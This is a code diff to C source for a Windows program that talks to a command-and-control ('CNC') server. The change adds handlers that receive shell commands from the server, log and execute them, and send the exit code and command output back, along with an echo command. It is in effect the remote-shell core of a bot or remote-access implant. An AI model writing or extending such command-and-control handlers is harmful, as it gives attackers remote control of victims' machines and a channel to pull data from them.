@@ -1,5 +1,6 @@
 #include <windows.h>
 #include "cnc.h"
+#include "echo.h"
 #include "shell.h"
 #include "logger.h"
 #include "commander.h"
@@ -29,15 +30,15 @@ void handle_echo()
         return;
     }
     cmd.text[cmd.text_len] = 0;
-    log_info("Received echo: %s", cmd.text);
+    log_info("Received echo: \"%s\"", cmd.text);
 
     ret = send_to_cnc(cmd.text, cmd.text_len);
+    free(cmd.text);
     if (ret != cmd.text_len)
     {
         log_error("Failed to send echoed text to CNC.");
         return;
     }
-    free(cmd.text);
 }
 
 void handle_shell()
@@ -58,13 +59,25 @@ void handle_shell()
         log_error("Failed to allocate memory for the shell command.");
         return;
     }
-    ret = recv_from_cnc(&cmd.cmd, cmd.cmd_len);
+    ret = recv_from_cnc(cmd.cmd, cmd.cmd_len + 1);
+    cmd.cmd[cmd.cmd_len] = 0;
     if (ret != cmd.cmd_len)
     {
         log_error("Received invalid shell command.");
         return;
     }
-    exec_shell_cmd(cmd.cmd, cmd.output);
+    log_info("Received shell command: \"%s\"", cmd.cmd);
+    ret = shell(&cmd);
+    free(cmd.cmd);
+    if (ret == EXEC_SHELL_FAILED)
+    {
+        send_to_cnc(&ret, sizeof(ret));
+    }
+    else
+    {
+        send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
+        send_to_cnc(cmd.output, cmd.output_len);
+    }
 }
 
 void listen_for_cmds()
